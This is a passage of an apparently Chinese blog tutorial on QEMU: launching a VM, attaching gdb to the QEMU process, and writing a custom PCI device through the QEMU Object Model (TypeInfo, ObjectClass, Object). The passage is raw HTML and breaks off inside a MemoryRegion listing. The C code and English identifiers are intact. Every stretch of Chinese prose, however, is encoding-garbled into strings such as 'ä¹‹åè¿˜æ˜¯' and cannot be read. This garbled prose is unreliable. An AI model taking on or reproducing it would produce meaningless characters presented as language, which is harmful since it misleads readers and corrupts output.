class="hljs-meta">#!/bin/bash</span><br>qemu-system-x86_64 \<br>-m 2G \<br>-smp 2 \<br>-kernel ./bzImage \<br>-append <span class="hljs-string">&quot;root=/dev/sda&quot;</span> \<br>-drive file=./stretch.img,format=raw \<br>-enable-kvm \<br>-vnc yourip:0<br></code></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯ç›´æ¥ç”¨ vnc è¿›è¡Œè¿æ¥å³å¯ï¼ˆå¦‚æœåªéœ€è¦åœ¨æœ¬åœ°è¿è¡Œçš„è¯å¯ä»¥ä¸ç”¨é™„åŠ  <code>-vnc</code> å‚æ•°ï¼Œè€Œæ˜¯åŠ ä¸Š <code>-nographic</code> å‚æ•°ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2022/07/12/yjcVlhtYOz4pQvC.png" alt="image.png"></p><h1>0x03. QEMU æºç è°ƒè¯•</h1><p>QEMU å…è®¸æˆ‘ä»¬é€šè¿‡ <code>-s</code> æˆ–æ˜¯ <code>-gdb tcp::1234</code> è¿™æ ·çš„é™„åŠ å‚æ•°æ¥è°ƒè¯•è™šæ‹Ÿæœºï¼ˆæ¯”å¦‚è¯´è°ƒè¯• Linux kernelï¼‰ï¼Œä½†æœ‰çš„æ—¶å€™æˆ‘ä»¬æƒ³è¦<strong>ç›´æ¥è°ƒè¯• QEMU æœ¬ä½“</strong>ï¼ˆæ¯”å¦‚è¯´è°ƒè¯•ä¸€äº›è‡ªå·±å†™çš„æ¨¡æ‹Ÿè®¾å¤‡ï¼‰ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬å°† Host ä¸Šçš„ QEMU è¿›ç¨‹ä½œä¸ºå¾…è°ƒè¯•å¯¹è±¡</p><p>å› ä¸º QEMU æœ¬èº«ä¹Ÿæ˜¯åœ¨ Host ä¸Šè¿è¡Œçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥ç¬”è€…è¿™é‡Œç»™å‡ºä¸€ä¸ªæ¯”è¾ƒç›´æ¥çš„è°ƒè¯• QEMU çš„åŠæ³•ï¼šæŠŠ QEMU æœ¬ä½“å¯åŠ¨èµ·æ¥åç›´æ¥ç”¨ <code>ps</code> æ‰¾ QEMU è¿›ç¨‹ç„¶å gdb attach  å³å¯åƒæ­£å¸¸è°ƒè¯•ä¸€ä¸ªæ™®é€šè¿›ç¨‹ä¸€æ ·è°ƒè¯• QEMUï¼š</p><p><img src="https://s2.loli.net/2023/04/13/ocrYWTQ4Nw3LEh5.png" alt="image.png"></p><p>å¦‚æœæ˜¯è‡ªå·±ç¼–è¯‘çš„ QEMU è¿™æ ·å°±å¯ä»¥ç›´æ¥ä»æºç è¿›è¡Œè°ƒè¯•äº†ï¼š</p><p><img src="https://s2.loli.net/2023/04/13/ol9OLkRDcusndU4.png" alt="image.png"></p><h1>0x04.ç®€æ˜“ QEMU è®¾å¤‡ç¼–å†™</h1><p>è™½ç„¶ Qemu æ”¯æŒæ¨¡æ‹Ÿå¤šç§è®¾å¤‡ï¼Œä½†æ˜¯å¹¶ä¸èƒ½æ¶µç›–ç°å­˜æ‰€æœ‰çš„è®¾å¤‡ç±»å‹ï¼ŒåŒæ—¶æœ‰çš„æ—¶å€™å‡ºäºä¸€äº›ç‰¹æ®Šçš„ç›®çš„æˆ‘ä»¬ä¹Ÿéœ€è¦è‡ªå®šä¹‰ä¸€äº›è®¾å¤‡ï¼Œå› æ­¤æœ¬èŠ‚ä¸»è¦è®²è¿°å¦‚ä½•åœ¨ Qemu å½“ä¸­ç¼–å†™ä¸€ä¸ªæ–°çš„ PCI ç±»å‹çš„è®¾å¤‡</p><blockquote><p>æ³¨1ï¼šåœ¨å¼€å§‹ä¹‹å‰ä½ å¯èƒ½éœ€è¦è¡¥å……ä¸€äº›<a href="https://arttnba3.cn/2022/08/20/HARDWARE-0X00-PCI_DEVICE/">PCI è®¾å¤‡çš„åŸºç¡€çŸ¥è¯†</a></p><p>æ³¨2ï¼šqemu å®˜æ–¹åœ¨ <code>hw/misc/edu.c</code> ä¸­ä¹Ÿæä¾›äº†ä¸€ä¸ªæ•™å­¦ç”¨çš„è®¾å¤‡æ ·ä¾‹ï¼Œred hat åˆ™åœ¨ <code>hw/misc/pci-testdev.c</code> ä¸­æä¾›äº†ä¸€ä¸ªæµ‹è¯•è®¾å¤‡ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒè¿™ä¸¤ä¸ªè®¾å¤‡æ¥æ„å»ºæˆ‘ä»¬çš„è®¾å¤‡</p></blockquote><h2 id="ä¸€ã€Qemu-Object-Model">ä¸€ã€Qemu Object Model</h2><p>è™½ç„¶ Qemu æ˜¯ä½¿ç”¨ C ç¼–å†™çš„ï¼Œä½†æ˜¯å…¶ä»£ç ä¹Ÿå……æ»¡äº† OOP çš„æ€æƒ³ï¼Œåœ¨ Qemu å½“ä¸­æœ‰ç€ä¸€å¥—å«åš <strong>Qemu Object Model</strong> çš„ä¸œè¥¿æ¥å®ç°é¢å‘å¯¹è±¡ï¼Œä¸»è¦ç”±è¿™å››ä¸ªç»„ä»¶æ„æˆï¼š</p><ul><li><code>Type</code>ï¼šç”¨æ¥å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„åŸºæœ¬å±æ€§ï¼Œä¾‹å¦‚ç±»çš„åå­—ã€å¤§å°ã€æ„é€ å‡½æ•°ç­‰</li><li><code>Class</code>ï¼šç”¨æ¥å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„é™æ€å†…å®¹ï¼Œä¾‹å¦‚ç±»ä¸­å­˜å‚¨çš„é™æ€æ•°æ®ã€æ–¹æ³•å‡½æ•°æŒ‡é’ˆç­‰</li><li><code>Object</code>ï¼šåŠ¨æ€åˆ†é…çš„ä¸€ä¸ªã€Œç±»ã€çš„å…·ä½“çš„å®ä¾‹ï¼ˆinstanceï¼‰ï¼Œå‚¨å­˜ç±»çš„åŠ¨æ€æ•°æ®</li><li><code>Property</code>ï¼šåŠ¨æ€å¯¹è±¡æ•°æ®çš„è®¿é—®å™¨ï¼ˆaccessorï¼‰ï¼Œå¯ä»¥é€šè¿‡ç›‘è§†å™¨æ¥å£è¿›è¡Œæ£€æŸ¥</li></ul><p>ç±»ä¼¼äº Golangï¼Œåœ¨ QOM å½“ä¸­ä½¿ç”¨æˆå‘˜åµŒå¥—çš„æ–¹å¼æ¥å®Œæˆç±»çš„ç»§æ‰¿ï¼Œçˆ¶ç±»ä½œä¸ºç±»ç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜ <code>parent</code> è€Œå­˜åœ¨ï¼Œå› æ­¤ä¹Ÿä¸æ”¯æŒå¤šç»§æ‰¿</p><blockquote><p>å‚è§è¿™ä¸ª<a href="https://www.linux-kvm.org/images/f/f6/2012-forum-QOM_CPU.pdf">ppt</a></p></blockquote><h3 id="Iã€TypeInfo-ç±»çš„åŸºæœ¬å±æ€§">Iã€TypeInfo - ç±»çš„åŸºæœ¬å±æ€§</h3><p><code>TypeInfo</code> è¿™ä¸€ç»“æ„ä½“ç”¨æ¥å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„åŸºæœ¬å±æ€§ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/qom/object.h</code> å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * TypeInfo:</span><br><span class="hljs-comment"> * @name: ç±»å‹å.</span><br><span class="hljs-comment"> * @parent: çˆ¶ç±»å‹å.</span><br><span class="hljs-comment"> * @instance_size: å¯¹è±¡å¤§å° (#Object çš„è¡ç”Ÿç‰©). </span><br><span class="hljs-comment"> *   è‹¥ @instance_size ä¸º 0, åˆ™å¯¹è±¡çš„å¤§å°ä¸ºå…¶çˆ¶ç±»çš„å¤§å°</span><br><span class="hljs-comment"> * @instance_init: è¯¥å‡½æ•°è¢«è°ƒç”¨ä»¥åˆå§‹åŒ–å¯¹è±¡ï¼ˆè¯‘æ³¨ï¼šæ„é€ å‡½æ•°ï¼‰. </span><br><span class="hljs-comment"> *   ï¼ˆè¯‘æ³¨ï¼šè°ƒç”¨å‰ï¼‰çˆ¶ç±»å·²è¢«åˆå§‹åŒ–ï¼Œå› æ­¤å­ç±»åªéœ€è¦åˆå§‹åŒ–ä»–è‡ªå·±çš„æˆå‘˜ã€‚</span><br><span class="hljs-comment"> * @instance_post_init: è¯¥å‡½æ•°è¢«è°ƒç”¨ä»¥ç»“æŸä¸€ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–ï¼Œ</span><br><span class="hljs-comment"> *   åœ¨æ‰€æœ‰çš„ @instance_init å‡½æ•°è¢«è°ƒç”¨ä¹‹å.</span><br><span class="hljs-comment"> * @instance_finalize: è¯¥å‡½æ•°åœ¨å¯¹è±¡è¢«ææ„æ—¶è°ƒç”¨. å…¶åœ¨</span><br><span class="hljs-comment"> *   çˆ¶ç±»çš„ @instance_finalize è¢«è°ƒç”¨ä¹‹å‰è¢«è°ƒç”¨.</span><br><span class="hljs-comment"> *   åœ¨è¯¥å‡½æ•°ä¸­ä¸€ä¸ªå¯¹è±¡åº”å½“ä»…é‡Šæ”¾è¯¥å¯¹è±¡ç‰¹æœ‰çš„æˆå‘˜ã€‚</span><br><span class="hljs-comment"> * @abstract: è‹¥è¯¥åŸŸä¸ºçœŸï¼Œåˆ™è¯¥ç±»ä¸ºä¸€ä¸ªè™šç±»ï¼Œä¸èƒ½è¢«ç›´æ¥å®ä¾‹åŒ–ã€‚</span><br><span class="hljs-comment"> * @class_size: è¿™ä¸ªå¯¹è±¡çš„ç±»å¯¹è±¡çš„å¤§å° (#Object çš„è¡ç”Ÿç‰©)</span><br><span class="hljs-comment"> *   è‹¥ @class_size ä¸º 0, åˆ™ç±»çš„å¤§å°ä¸ºå…¶çˆ¶ç±»çš„å¤§å°ã€‚</span><br><span class="hljs-comment"> *   è¿™å…è®¸ä¸€ä¸ªç±»å‹åœ¨æ²¡æœ‰æ·»åŠ é¢å¤–çš„è™šå‡½æ•°æ—¶é¿å…å®ç°ä¸€ä¸ªæ˜¾å¼çš„ç±»å‹ã€‚</span><br><span class="hljs-comment"> * @class_init: è¯¥å‡½æ•°åœ¨æ‰€æœ‰çˆ¶ç±»åˆå§‹åŒ–ç»“æŸåè¢«è°ƒç”¨ï¼Œ</span><br><span class="hljs-comment"> *   ä»¥å…è®¸ä¸€ä¸ªç±»è®¾ç½®ä»–çš„é»˜è®¤è™šæ–¹æ³•æŒ‡é’ˆ.</span><br><span class="hljs-comment"> *   è¿™ä¹Ÿå…è®¸è¯¥å‡½æ•°é‡å†™çˆ¶ç±»çš„è™šæ–¹æ³•ã€‚</span><br><span class="hljs-comment"> * @class_base_init: åœ¨æ‰€æœ‰çš„çˆ¶ç±»è¢«åˆå§‹åŒ–åã€ä½†</span><br><span class="hljs-comment"> *   åœ¨ç±»è‡ªèº«åˆå§‹åŒ–å‰ï¼Œä¸ºæ‰€æœ‰çš„åŸºç±»è°ƒç”¨è¯¥å‡½æ•°ã€‚</span><br><span class="hljs-comment"> *   è¯¥å‡½æ•°ç”¨ä»¥æ’¤é”€ä»çˆ¶ç±» memcpy åˆ°å­ç±»çš„å½±å“.</span><br><span class="hljs-comment"> * @class_data: ä¼ é€’ç»™ @class_init ä¸ @class_base_init çš„æ•°æ®,</span><br><span class="hljs-comment"> *   è¿™ä¼šåœ¨å»ºç«‹åŠ¨æ€ç±»å‹æ—¶æœ‰ç”¨ã€‚</span><br><span class="hljs-comment"> * @interfaces: ä¸è¿™ä¸ªç±»å‹ç›¸å…³çš„æ¥å£. </span><br><span class="hljs-comment"> *   å…¶åº”å½“æŒ‡å‘ä¸€ä¸ªä»¥ 0 å¡«å……å…ƒç´ ç»“å°¾çš„é™æ€æ•°ç»„</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TypeInfo</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *parent;<br><br>    <span class="hljs-type">size_t</span> instance_size;<br>    <span class="hljs-type">void</span> (*instance_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_post_init)(Object *obj);<br>    <span class="hljs-type">void</span> (*instance_finalize)(Object *obj);<br><br>    <span class="hljs-type">bool</span> abstract;<br>    <span class="hljs-type">size_t</span> class_size;<br><br>    <span class="hljs-type">void</span> (*class_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> (*class_base_init)(ObjectClass *klass, <span class="hljs-type">void</span> *data);<br>    <span class="hljs-type">void</span> *class_data;<br><br>    InterfaceInfo *interfaces;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ Qemu ä¸­è¦å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å®é™…ä¸Šéœ€è¦å®šä¹‰ä¸€ä¸ª TypeInfo ç±»å‹çš„å˜é‡ï¼Œä¾‹å¦‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ªåœ¨ Qemu å®šä¹‰ä¸€ä¸ªè‡ªå®šä¹‰ç±»çš„ğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> a3_register_types(<span class="hljs-type">void</span>) &#123;<br>    type_register_static(&amp;a3_type_info);<br>&#125;<br><br>type_init(a3_register_types);<br></code></pre></td></tr></table></figure><p><code>type_init()</code> å…¶å®å°±æ˜¯ <code>constructor</code> è¿™ä¸€ gcc attribute çš„å°è£…ï¼Œå…¶ä½œç”¨å°±æ˜¯å°†ä¸€ä¸ªå‡½æ•°åŠ å…¥åˆ°ä¸€ä¸ª <code>init_array</code> å½“ä¸­ï¼Œåœ¨ Qemu ç¨‹åºå¯åŠ¨æ—¶åœ¨è¿›å…¥åˆ° main å‡½æ•°ä¹‹å‰ä¼šå…ˆè°ƒç”¨ <code>init_array</code> ä¸­çš„å‡½æ•°ï¼Œå› æ­¤è¿™é‡Œä¼šè°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œå…¶ä½œç”¨ä¾¿æ˜¯è°ƒç”¨ <code>type_register_static()</code> å°†æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»å‹ <code>a3_type_info</code> æ³¨å†Œåˆ°å…¨å±€çš„ç±»å‹è¡¨ä¸­</p><h3 id="IIã€Class-ç±»çš„é™æ€å†…å®¹">IIã€Class - ç±»çš„é™æ€å†…å®¹</h3><p>å½“æˆ‘ä»¬é€šè¿‡ä¸€ä¸ª <code>TypeInfo</code> ç»“æ„ä½“å®šä¹‰äº†ä¸€ä¸ªç±»ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å®šä¹‰ä¸€ä¸ª Class ç»“æ„ä½“æ¥å®šä¹‰è¿™ä¸ªç±»çš„é™æ€å†…å®¹ï¼ŒåŒ…æ‹¬å‡½æ•°è¡¨ã€é™æ€æˆå‘˜ç­‰ï¼Œå…¶åº”å½“ç»§æ‰¿äºå¯¹åº”çš„ Class ç»“æ„ä½“ç±»å‹ï¼Œä¾‹å¦‚æˆ‘ä»¬è‹¥æ˜¯è¦å®šä¹‰ä¸€ä¸ªæ–°çš„æœºå™¨ç±»ï¼Œåˆ™å…¶ Class åº”å½“ç»§æ‰¿äº <code>MachineClass</code></p><p>æ‰€æœ‰ Class ç»“æ„ä½“ç±»å‹çš„æœ€ç»ˆçš„çˆ¶ç±»éƒ½æ˜¯ <code>ObjectClass</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ObjectClass:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€æœ‰ç±»çš„åŸºç±».  #ObjectClass ä»…åŒ…å«ä¸€ä¸ªæ•´å‹ç±»å‹ handler</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ObjectClass</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Type type;<br>    GSList *interfaces;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];<br><br>    ObjectUnparent *unparent;<br><br>    GHashTable *properties;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Class</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆ Class çš„å®šä¹‰ä¹‹åæˆ‘ä»¬è¿˜åº”å½“åœ¨å‰é¢å®šä¹‰çš„ <code>a3_type_info</code> ä¸­æ·»åŠ ä¸Š Class size ä¸ Class çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    <span class="hljs-comment">// è¿™é‡Œçš„ oc å‚æ•°ä¾¿æ˜¯æ–°åˆ›å»ºçš„ Classï¼Œå…¨å±€åªæœ‰ä¸€ä¸ªè¯¥å®ä¾‹</span><br>    <span class="hljs-comment">// æˆ‘ä»¬åº”å½“ cast ä¸ºæˆ‘ä»¬è‡ªå·±çš„ Class ç±»å‹ï¼Œä¹‹åå†è¿›è¡Œç›¸åº”æ“ä½œ</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IIIã€Object-ç±»çš„å®ä¾‹å¯¹è±¡">IIIã€Object - ç±»çš„å®ä¾‹å¯¹è±¡</h3><p>æˆ‘ä»¬è¿˜éœ€è¦å®šä¹‰ä¸€ä¸ªç›¸åº”çš„ Object ç±»å‹æ¥è¡¨ç¤ºä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œå…¶åŒ…å«æœ‰è¿™ä¸ªç±»å®é™…çš„å…·ä½“æ•°æ®ï¼Œä¸”åº”å½“ç»§æ‰¿äºå¯¹åº”çš„ Object ç»“æ„ä½“ç±»å‹ï¼Œä¾‹å¦‚æˆ‘ä»¬è‹¥æ˜¯è¦å®šä¹‰ä¸€ä¸ªæ–°çš„æœºå™¨ç±»å‹ï¼Œå…¶å®ä¾‹ç±»å‹åº”å½“ç»§æ‰¿è‡ª <code>MachineState</code></p><p>æ‰€æœ‰ Object ç»“æ„ä½“ç±»å‹çš„æœ€ç»ˆçš„çˆ¶ç±»éƒ½æ˜¯ <code>Object</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Object:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€æœ‰å¯¹è±¡çš„åŸºç±»ã€‚è¯¥å¯¹è±¡çš„ç¬¬ä¸€ä¸ªæˆå‘˜ä¸ºä¸€ä¸ªæŒ‡å‘ #ObjectClass çš„æŒ‡é’ˆã€‚</span><br><span class="hljs-comment"> * å› ä¸º C ä¸­å°†ä¸€ä¸ªç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªæˆå‘˜ç»„ç»‡åœ¨è¯¥ç»“æ„ä½“çš„ 0 å­—èŠ‚èµ·å§‹å¤„ï¼Œ</span><br><span class="hljs-comment"> * åªè¦ä»»ä½•çš„å­ç±»å°†å…¶çˆ¶ç±»ä½œä¸ºç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œæˆ‘ä»¬éƒ½èƒ½ç›´æ¥è½¬åŒ–ä¸ºä¸€ä¸ª #Object.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å› æ­¤, #Object åŒ…å«ä¸€ä¸ªå¯¹å¯¹è±¡ç±»çš„å¼•ç”¨ä½œä¸ºå…¶ç¬¬ä¸€ä¸ªæˆå‘˜ã€‚ </span><br><span class="hljs-comment"> * è¿™å…è®¸åœ¨è¿è¡Œæ—¶è¯†åˆ«å¯¹è±¡çš„çœŸå®ç±»å‹</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass *<span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br>    ObjectFree *<span class="hljs-built_in">free</span>;<br>    GHashTable *properties;<br>    <span class="hljs-type">uint32_t</span> ref;<br>    Object *parent;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Object parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆ Object çš„å®šä¹‰ä¹‹åæˆ‘ä»¬è¿˜åº”å½“åœ¨å‰é¢å®šä¹‰çš„ <code>a3_type_info</code> ä¸­æ·»åŠ ä¸Š Object size ä¸ Object çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_object_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// è¿™é‡Œçš„ obj å‚æ•°ä¾¿æ˜¯åŠ¨æ€åˆ›å»ºçš„ç±»å‹å®ä¾‹</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .instance_init = a3_object_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3Object),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IVã€ç±»çš„åˆ›å»ºä¸é‡Šæ”¾">IVã€ç±»çš„åˆ›å»ºä¸é‡Šæ”¾</h3><p>ç±»ä¼¼äºåœ¨ C++ å½“ä¸­ä½¿ç”¨ <code>new</code> ä¸ <code>delete</code> æ¥åˆ›å»ºä¸é‡Šæ”¾ä¸€ä¸ªç±»å®ä¾‹ï¼Œåœ¨ QOM ä¸­æˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>object_new()</code> ä¸ <code>object_delete()</code> æ¥åˆ›å»ºä¸é”€æ¯ä¸€ä¸ª QOM ç±»å®ä¾‹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ <code>åˆ†é…/é‡Šæ”¾ç±»ç©ºé—´ + æ˜¾ç¤ºè°ƒç”¨æ„é€ /ææ„å‡½æ•°</code></p><p>QOM åˆ¤æ–­åˆ›å»ºç±»å®ä¾‹çš„ç±»å‹æ˜¯é€šè¿‡ç±»çš„åå­—ï¼Œå³ <code>TypeInfo-&gt;name</code>ï¼Œå½“åˆ›å»ºç±»å®ä¾‹æ—¶ Qemu ä¼šéå†æ‰€æœ‰çš„ TypeInfo å¹¶å¯»æ‰¾åå­—åŒ¹é…çš„é‚£ä¸ªï¼Œä»è€Œè°ƒç”¨åˆ°å¯¹åº”çš„æ„é€ å‡½æ•°ï¼Œå¹¶å°†å…¶åŸºç±» <code>Object-&gt;class</code> æŒ‡å‘å¯¹åº”çš„ class</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// create a QOM object</span><br>A3Object *a3obj = object_new(<span class="hljs-string">&quot;a3_type&quot;</span>);<br><span class="hljs-comment">// delete a QOM object</span><br>object_delete(a3obj);<br></code></pre></td></tr></table></figure><h2 id="äºŒã€MemoryRegion-Qemu-ä¸­çš„ä¸€å—å†…å­˜åŒºåŸŸ">äºŒã€MemoryRegion - Qemu ä¸­çš„ä¸€å—å†…å­˜åŒºåŸŸ</h2><p>åœ¨ Qemu å½“ä¸­ä½¿ç”¨ <code>MemoryRegion</code> ç»“æ„ä½“ç±»å‹æ¥è¡¨ç¤ºä¸€å—å…·ä½“çš„ Guest ç‰©ç†å†…å­˜åŒºåŸŸï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/exec/memory.h</code> å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 